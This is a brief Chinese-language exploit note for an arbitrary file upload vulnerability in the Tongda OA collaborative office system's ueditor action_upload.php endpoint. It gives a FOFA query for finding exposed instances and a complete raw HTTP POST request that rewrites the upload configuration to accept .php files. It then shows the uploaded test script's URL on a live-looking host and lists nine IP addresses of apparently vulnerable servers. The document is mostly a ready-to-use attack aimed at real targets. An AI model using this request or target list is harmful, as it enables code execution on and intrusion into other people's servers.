# 通达 oa 协同办公系统 ueditor moduleueditorphpaction_upload.php任意文件上传

    ## fofa

```
app="TDXK-通达OA"
```

## exp

```
POST /module/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=module/ueditor/php/upload/test&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=test HTTP/1.1
Host: 60.190.185.74:88
accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bvdnf1pq3ag7c7gej46f6i4g80; KEY_RANDOMDATA=11700
Content-Type: multipart/form-data; boundary=0b10048704813c1097efc627598b2d3e
Connection: close
Content-Length: 204

--0b10048704813c1097efc627598b2d3e
Content-Disposition: form-data; name="test"; filename="test.php"
Content-Type: application/octet-stream

<?php echo '555';?>
--0b10048704813c1097efc627598b2d3e—
```

http://60.190.185.74:88/module/ueditor/php/upload/test.php

![image](https://s1.ax1x.com/2023/04/06/ppoSX0U.png)

## 例子

```
http://1.202.216.130:3199
http://117.159.225.185:8088
http://125.31.39.26:8088
http://139.159.189.132:7086
http://148.70.171.132:81
http://183.250.243.227:8001
http://218.16.142.55:8888
http://218.70.17.86:88
http://60.190.185.74:88
```
